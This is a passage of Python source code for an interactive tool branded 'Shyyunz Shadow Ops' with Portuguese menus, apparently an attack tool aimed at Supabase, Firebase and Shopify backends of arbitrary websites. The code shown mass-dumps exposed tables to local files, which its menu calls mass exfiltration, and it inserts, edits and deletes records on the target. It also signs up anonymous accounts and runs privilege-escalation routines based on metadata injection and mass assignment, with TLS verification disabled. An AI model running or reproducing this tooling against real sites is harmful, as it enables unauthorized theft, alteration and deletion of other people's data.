            "[white][2] Testar Acesso Admin[/white]\n"
            "[white][3] Dump de Produtos Públicos[/white]\n"
            "[bold red][0] Voltar[/bold red]"
        )
        console.print(Panel(menu, title="SHOPIFY AUDITOR", border_style="green"))
        c = input("\n[SHY_SHOP] Ação: ").strip().upper()
        if c == "0": break
        elif c == "1": await auditor.dump_api_data(f"{shop_url}/pages.json")
        elif c == "2": 
            async with httpx.AsyncClient(verify=False) as client:
                r = await client.get(f"{shop_url}/admin")
                if r.status_code == 200: console.print("[bold red][!!!] ADMIN ACESSÍVEL SEM LOGIN?[/bold red]")
                else: console.print(f"[dim][-] Admin Status: {r.status_code}[/dim]")
        elif c == "3": await auditor.dump_api_data(f"{shop_url}/products.json")

async def pick_record_paginated(auditor, table_name):
    """Seleção acumulativa idêntica ao fluxo de leitura (S/N/T)."""
    all_rows = []
    offset = 0
    limit = 20
    id_col = None
    
    while True:
        url = f"{auditor.base_url}{table_name}?select=*&limit={limit}&offset={offset}"
        async with httpx.AsyncClient(timeout=15.0, verify=False) as cl:
            try:
                r = await cl.get(url, headers=auditor.headers)
                if r.status_code not in [200, 206]: break
                rows = r.json()
                if not rows: break
                all_rows.extend(rows)
            except: break
            
        if not id_col:
            for cn in ["id", "uuid", "key", "uid", "id_primary"]:
                if cn in all_rows[0]: id_col = cn; break
            if not id_col: id_col = list(all_rows[0].keys())[0]

        # EXIBIÇÃO ACUMULATIVA (S/N/T)
        console.print(f"\n[bold yellow]--- Seleção: {table_name} ({len(all_rows)} carregados) ---[/bold yellow]")
        # Mostra apenas o bloco novo para não poluir
        for ri, row in enumerate(all_rows[offset:], offset + 1):
            val = row.get(id_col, "?")
            extra = next((v for k,v in row.items() if k.lower() in ["email", "username", "name"] and v), "")
            console.print(f"  [cyan][{ri}][/cyan] [bold]{val}[/bold] [dim]({str(extra)[:50]})[/dim]")
        
        offset += len(rows)
        
        # A pergunta idêntica ao DUMP [1]
        msg = f"\n[?] Exibir mais {limit} registros? (S/N/T para todos / Ou o número para selecionar): "
        choice = input(msg).strip().upper()
        
        if choice == "N": return None
        if choice == "S": continue
        if choice == "T": limit = 500; continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(all_rows):
                return all_rows[idx-1], id_col
        
        # Se clicar ENTER ou algo inválido, assume que quer ver mais? Não, vamos ser seguros.
        if not choice: continue
    return None
        
async def edit_table_routine(auditor, tabela):
    console.print(f"\n[bold cyan]--- EDITAR: '{tabela}' ---[/bold cyan]")
    res = await pick_record_paginated(auditor, tabela)
    if not res: return
    selected, id_col = res
    
    filtro = f"{id_col}=eq.{selected[id_col]}"
    console.print(f"\n[bold yellow]Campos de {id_col}={selected[id_col]}:[/bold yellow]")
    flat_fields = {}
    fn = 1
    for col, val in selected.items():
        if isinstance(val, dict):
            for sk, sv in val.items():
                flat_fields[str(fn)] = (col, sk, sv); console.print(f"  [cyan][{fn}][/cyan] {col}.{sk} = {sv}"); fn += 1
        else:
            flat_fields[str(fn)] = (col, None, val); console.print(f"  [cyan][{fn}][/cyan] {col} = {val}"); fn += 1
    
    raw = input("\n  Edições (num=valor ou 1=novo_email, 2=novo_valor...): ").strip()
    # Suporte ao Speed Edit: num-valor ou num=valor
    raw = raw.replace("-", "=")
    if raw:
        payload = {}
        for part in raw.split(","):
            if "=" in part:
                num, nval = part.split("=", 1)
                num = num.strip()
                if num in flat_fields:
                    col, sk, _ = flat_fields[num]
                    # Tenta converter tipos automáticos
                    val_typed = nval.strip()
                    if val_typed.isdigit(): val_typed = int(val_typed)
                    elif val_typed.lower() in ["true", "false"]: val_typed = val_typed.lower() == "true"
                    
                    if sk:
                        if col not in payload: payload[col] = dict(selected[col])
                        payload[col][sk] = val_typed
                    else: payload[col] = val_typed
        if payload:
            async with httpx.AsyncClient(timeout=15.0, verify=False) as cl:
                res = await cl.patch(f"{auditor.base_url}{tabela}?{filtro}", headers=auditor.headers, json=payload)
                if res.status_code in [200, 201, 204]: console.print("[green][+] Sucesso! Registro editado com sucesso.[/green]")
                else: console.print(f"[red]Erro na edição: {res.text[:200]}[/red]")

async def delete_table_routine(auditor, tabela):
    console.print(f"\n[bold red]--- DELETAR: '{tabela}' ---[/bold red]")
    res = await pick_record_paginated(auditor, tabela)
    if not res: return
    selected, id_col = res
    
    target_id = selected[id_col]
    confirm = input(f"[bold red][!] CONFIRMAR deleção de {id_col}='{target_id}'? (S/N): [/bold red]").strip().upper()
    if confirm == "S":
        async with httpx.AsyncClient(timeout=15.0, verify=False) as cl:
            res = await cl.delete(f"{auditor.base_url}{tabela}?{id_col}=eq.{target_id}", headers=auditor.headers)
            if res.status_code in [200, 204]: console.print("[green][+] Registro deletado com sucesso![/green]")
            else: console.print(f"[red]Erro ao deletar: {res.text[:200]}[/red]")

async def supabase_routine(target, apikey, site_url, bearer_token=None):
    ai_key = sh_config.get_api_key()
    brain = ShyyunzBrain(ai_key) if ai_key else None
    
    auditor = ShyyunzAuditor(target, apikey, bearer_token)
    await auditor.pre_scan_auth_check()
    await auditor.perform_intelligence_gathering()
    words = list(set(["users", "profiles", "accounts", "admins", "settings", "orders", "config", "roles", "secrets", "api_keys", "payments", "logs", "products", "categories", "branches", "stocks", "sales", "coupons", "chats", "messages"] + list(auditor.graphql_discovered) + knowledge.data["tables"]))
    await auditor.run_scan(words, brain)
    
    def show_summary():
        nonlocal table_map
        table_map = {}
        sum_t = Table(title="[bold red]VETORES DE EXPLORAÇÃO SELECIONADOS[/bold red]")
        sum_t.add_column("Nr."); sum_t.add_column("Alvo"); sum_t.add_column("Leitura"); sum_t.add_column("Escrita (W/U/D)"); sum_t.add_column("Status")
        for i, r in enumerate(auditor.results, 1):
            read_s = "[dim]RLS[/dim]"
            if r.get('readable'): read_s = "[bold green]EXPOSTO (DADOS)[/bold green]" if r.get('has_data') else "[bold yellow]EXPOSTO (VAZIA)[/bold yellow]"
            wv = r.get('writes', {"post":False,"patch":False,"delete":False})
            write_s = f"[{'W' if wv['post'] else '-'}/{'U' if wv['patch'] else '-'}/{'D' if wv['delete'] else '-'}]"
            st = "[bold red]CRÍTICO[/bold red]" if r.get('readable') or any(wv.values()) else "[yellow]ALTO[/yellow]"
            sum_t.add_row(str(i), r['name'], read_s, write_s + (f" ({r['bypass']})" if r.get('bypass') else ""), st)
            table_map[str(i)] = r
        console.print(sum_t)

    show_summary()

    while True:
        menu_text = (
            "[bold cyan]DADOS E EXFILTRAÇÃO[/bold cyan]\n"
            "[white][1] Ver Dados (Dump) [S] Bearer token (logar sua conta) [D] Sugar Tudo (Mass Exfil)[/white]\n\n"
            "[bold cyan]ATAQUE E ESCRITA[/bold cyan]\n"
            "[white][6] Inserir (POST)      [7] Editar (PATCH)    [8] Deletar (DEL)[/white]\n"
            "[white][3] Criar Conta         [9] Login Anônimo     [E] Escalar Privilégios[/white]\n\n"
            "[bold cyan]EXPLORAÇÃO PROFUNDA[/bold cyan]\n"
            "[white][R] Scan de RPCs        [B] Scan de Buckets   [K] Config / Brain[/white]\n\n"
            "[bold red][0] Voltar / Novo Alvo[/bold red]"
        )
        console.print(Panel(menu_text, title="PAINEL DE OPERAÇÕES", border_style="cyan"))
        c = input("\n[SHY_OPS] Ação: ").strip().upper()
        
        if c == "0": break
        elif c == "D":
            idx = input("[?] Nr. do alvo para Dump Completo (ou 'TUDO'): ").strip().upper()
            if idx == "TUDO":
                out = f"dump_{auditor.project_ref}_{int(time.time())}"
                os.makedirs(out, exist_ok=True)
                count = 0
                async with httpx.AsyncClient() as cl:
                    for r in auditor.results:
                        if r.get('readable'):
                            try:
                                resp = await cl.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
                                with open(f"{out}/{r['name']}.json", "w") as f:
                                    f.write(json.dumps(resp.json(), indent=2))
                                count += 1
                            except: pass
                console.print(Panel(f"{count} arquivos salvos em [bold green]{out}/[/bold green]", title="Exfiltração em Massa"))
            elif idx in table_map:
                await auditor.dump_table(table_map[idx]['name'])
            else:
                console.print("[red]Opção inválida.[/red]")
        elif c == "1":
            idx = input("Nr. do alvo: ").strip()
            if idx not in table_map: console.print("[red]Número inválido.[/red]")
            else:
                target_table = table_map[idx]['name']
                await auditor.dump_table(target_table)
        elif c == "R": await auditor.rpc_sniper(brain)
        elif c == "B": await auditor.deep_bucket_scan()
        elif c == "3":
            em = input("[📧] Email: ").strip(); pw = input("[🔑] Senha: ").strip()
            if em and pw: await auditor.create_account(em, pw)
        elif c == "9":
            try:
                async with httpx.AsyncClient() as cl:
                    r = await cl.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey}, json={})
                    if r.status_code in [200, 201]:
                        tk = r.json().get('access_token')
                        if tk:
                            auditor.bearer = tk; auditor.headers["Authorization"] = f"Bearer {tk}"
                            console.print("[bold green][+] Login Anônimo Sucesso![/bold green]")
                    else: console.print(f"[red][!] Erro: {r.text[:200]}[/red]")
            except Exception as e: console.print(f"[dim][!] Erro no Login Anônimo: {e}[/dim]")
        elif c == "E":
            console.print("[1] Sniper Sign-up (Metadata Injection) [2] Profile Sniper (Mass Assignment)")
            sub_c = input("\n[SHY_EXPL] Tipo de Escalada: ").strip()
            if sub_c == "1": await auditor.exploit_escalation()
            elif sub_c == "2": await auditor.exploit_mass_assignment()
        elif c == "6":
            idx = input("Nr. do alvo: ").strip()
            if idx in table_map:
                tabela = table_map[idx]['name']
                console.print(f"\n[bold green]--- INSERIR em '{tabela}' ---[/bold green]")
                payload = prompt_payload()
                if payload:
                    async with httpx.AsyncClient() as cl:
                        res = await cl.post(f"{auditor.base_url}{tabela}", headers=auditor.headers, json=payload)
                        if res.status_code in [200, 201]: console.print(f"[bold green][+] Criado com sucesso! ({res.status_code})[/bold green]")
                        else: console.print(f"[red]Erro ({res.status_code}): {res.text}[/red]")
        elif c == "7":
            idx = input("Nr. do alvo: ").strip()
            if idx in table_map:
                tabela = table_map[idx]['name']
                await edit_table_routine(auditor, tabela)
        elif c == "8":
            idx = input("Nr. do alvo: ").strip()
            if idx in table_map:
                tabela = table_map[idx]['name']
                await delete_table_routine(auditor, tabela)
        elif c == "S":
            jwt = input("\n[🔑] Digite o Bearer Token (JWT): ").strip()
            if jwt:
                auditor.bearer = jwt
                auditor.headers.update({"Authorization": f"Bearer {jwt}"})
                console.print("[bold green][+] Bearer Token configurado com sucesso![/bold green]")
                # Re-verifica admin status com o novo token
                async with httpx.AsyncClient() as cl:
                    r = await cl.get(f"{auditor.auth_url}user", headers=auditor.headers)
                    if r.status_code == 200:
                        console.print(f"[bold green][!] LOGADO: {r.json().get('email', 'Usuário')}[/bold green]")
                    else: console.print(f"[dim][-] Status do Token: {r.status_code}[/dim]")
        elif c == "K":
            opt = input("[1] Ver Memória  [2] Trocar Gemini Key  [3] Limpar Memória  [4] Adicionar Tabela: ").strip()
            if opt == "1": console.print(Panel(json.dumps(knowledge.data, indent=2)))
            elif opt == "2":
                key = input("Nova Key: ").strip()
                if sh_config.set_api_key(key): console.print("[green]Key atualizada.[/green]")
            elif opt == "3":
                knowledge.data = {"tables":[], "rpcs":[], "buckets":[]}; knowledge.save(); console.print("[green]Limpo[/green]")
            elif opt == "4":
                nt = input("[?] Nome da tabela para adicionar e scanear: ").strip()
                if nt:
                    knowledge.learn("tables", nt)
                    # Realiza scan imediato da nova tabela
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as cl:
                        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as pr:
                            tk = pr.add_task(f"[bold cyan]Escaneando nova tabela: {nt}...", total=1)
                            await auditor.check_target(cl, nt, "TABLE", pr, tk, brain or None)
                        console.print(f"[bold green][+] Tabela '{nt}' adicionada e auditada com sucesso![/bold green]")
                    # Atualiza e Re-exibe o Sumário
                    show_summary()

async def audit_routine():
    console.print(Align.center(BRANDED_BANNER))
    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR v2.0 - SHADOW OPS[/bold magenta]", border_style="cyan")))
    site_url = console.input("\n[bold cyan][🌐 SHY_SEC] URL:[/bold cyan] ").strip()
    
    # Sanitização: Remove caracteres de controle e conserta URLs
    site_url = "".join(ch for ch in site_url if ch.isprintable())
    site_url = site_url.replace("https://https://", "https://").replace("http://http://", "http://")
    
    if site_url.lower() in ["0", "sair", "exit"]: return False
    target, apikey, fb_project, fb_key, shop_detected, discovered_api = await fetch_baas_details(site_url)
    
    if shop_detected:
        console.print(f"[bold green][+] Shopify Detectado: {shop_detected}[/bold green]")
        ans = input("[?] Este é um alvo Shopify. Pivotar para Auditoria Shopify? (S/N): ").strip().upper()
        if ans == "S":
            await shopify_routine(shop_detected, site_url)
            return True
    
    if fb_project:
        pivoted = False
        if discovered_api:
            console.print(f"\n[bold yellow][!] AVISO: Notei que este site possui uma API em {discovered_api}[/bold yellow]")
            ans = input("[?] Deseja auditar esta API em vez do Firebase? (S/N): ").strip().upper()
            if ans == "S":
                await advanced_menu(AdvancedAuditor(discovered_api), site_url)
                pivoted = True
        
        if not pivoted:
            await firebase_routine(fb_project, fb_key, site_url)
        return True
    
    if target and apikey:
        await supabase_routine(target, apikey, site_url)
        return True

    # Se não detectou nada automaticamente
    adv_choice = input("\n[?] Nenhuma BaaS detectada automaticamente. Ativar Modo Avançado (Fuzzing/API)? (S/N): ").strip().upper()
    if adv_choice == "S":
        await advanced_menu(AdvancedAuditor(site_url), site_url)
        return True

    # Manual Fallback
    target = input("URL Supabase: ").strip()
    apikey = input("API Key: ").strip()
    
    # Sanitização de inputs manuais
    target = "".join(ch for ch in target if ch.isprintable() and ch not in "│┌┐└┘├┤┬┴┼")
    apikey = "".join(ch for ch in apikey if ch.isprintable() and ch not in "│┌┐└┘├┤┬┴┼")
    
    if target and apikey:
        await supabase_routine(target, apikey, site_url)
    return True

async def main():
    while not sh_config.get_api_key():
        console.clear()
        console.print(Align.center(BRANDED_BANNER))
        console.print(Panel(
            "[bold yellow]SHYYUNZ v2.0 - SHADOW OPS SETUP[/bold yellow]\n\n"
            "O [bold magenta]Cérebro Analítico (IA)[/bold magenta] está desativado.\n"
            "Insira sua [bold cyan]Gemini API Key[/bold cyan] (começa com AIza...).\n\n"
            "[dim]A chave será salva localmente e nunca compartilhada.[/dim]",
            title="Configuração Inicial"
        ))
        key = console.input("\n[bold cyan][🧠 CONFIG][/bold cyan] API Key ou 'SAIR' p/ ignorar: ").strip()
        if key.upper() == "SAIR":
            console.print("[yellow][!] Scan rodará sem IA.[/yellow]")
            time.sleep(1.5); break
        if sh_config.set_api_key(key):
            console.print("[bold green][+] Chave salva com sucesso![/bold green]")
            time.sleep(1); break
        else:
            console.print("[bold red][!] Chave inválida.[/bold red]")
            time.sleep(2)

    while True:
        if not await audit_routine(): break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, EOFError):
        console.print("\n[bold cyan]👋 Shyyunz encerrado.[/bold cyan]")
